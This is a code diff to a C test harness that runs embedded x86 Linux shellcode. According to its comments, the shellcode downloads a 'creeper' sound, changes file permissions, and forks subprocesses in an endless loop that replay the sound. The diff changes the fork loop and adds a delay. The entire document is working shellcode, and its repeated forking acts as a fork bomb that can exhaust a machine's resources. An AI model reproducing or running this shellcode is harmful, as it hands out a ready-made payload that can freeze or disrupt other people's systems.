@@ -5,7 +5,7 @@
 
 int main(void)
 {
-        char SC[345] = "\x6a\x02\x58\xcd\x80" //First part is "download sound part"
+        char SC[346] = "\x6a\x02\x58\xcd\x80" //First part is "download sound part"
                        "\x66\x85\xc0\x74\x5e" //Switch between "download parts" and file handling/playing parts at bottom
                        "\x6a\x02\x58\xcd\x80" //Switch between first part & second part for subprocessing...
                        "\x66\x85\xc0\x74\x57"
@@ -52,17 +52,17 @@ int main(void)
 		       "\x75\x68\x65\x65\x70\x65\x68\x2e\x2f\x63\x72\x89\xe3\x6a\x0f\x58"
                        "\xcd\x80" //End of "change permissions" part
                        "\x6a\x02\x58\xcd\x80"
-                       "\x66\x85\xc0\x74\x17" //Fork more subprocesses that jump ahead & play creeper sound repeatedly at same time!
-                       "\xeb\x18"
+                       "\x66\x85\xc0\x74\x02" //Fork more subprocesses that jump ahead & play creeper sound repeatedly at same time!
+                       "\xeb\x2d"
+                       "\x6a\x01\x6a\x01\x89\xe3\x31\xc9\xb8\xa3\x10\x01\x80\x05\xff\xef"
+                       "\xfe\x7f\xcd\x80" //Wait a few seconds before playing sound to make shellcode more entertaining
+                       "\xeb\xde\x90\x90" //Jump back to keep perpetuating forks
                        "\x5b\x31\xc0\x88\x43\x10\x89\x5b\x14\x89\x43"
 	               "\x18\x8d\x4b\x14\x31\xd2\xb0\x0b\xcd\x80"
-                       "\xeb\xdd\x90" //Jump back to keep perpetuating forks
-                       "\x6a\x01\x6a\x03\x89\xe3\x31\xc9\xb8\xa3\x10\x01\x80\x05\xff\xef"
-                       "\xfe\x7f\xcd\x80" //Wait a few seconds before playing sound to make shellcode more entertaining
-                       "\xe8\xcf\xff\xff\xff\x2e"
-		       "\x2f\x63\x72\x65\x65\x70\x65\x72\x5f\x72\x75\x6e\x6e" //Data related to execution itself
-		       "\x65\x72\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
-                       "\x20\x20\x20\x20\x20\x20\x00"; //End of "Play part"
+                       "\xe8\xe6\xff\xff\xff"
+                       "\x2e\x2f\x63\x72\x65\x65\x70\x65\x72\x5f\x72\x75\x6e" //Data related to execution itself
+                       "\x6e\x65\x72\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
+                       "\x20\x20\x20\x20\x20\x20\x20\x00"; //End of "Play part"
 
        	fprintf(stdout,"Length: %d\n",strlen(SC));
 	(*(void(*)()) SC)();
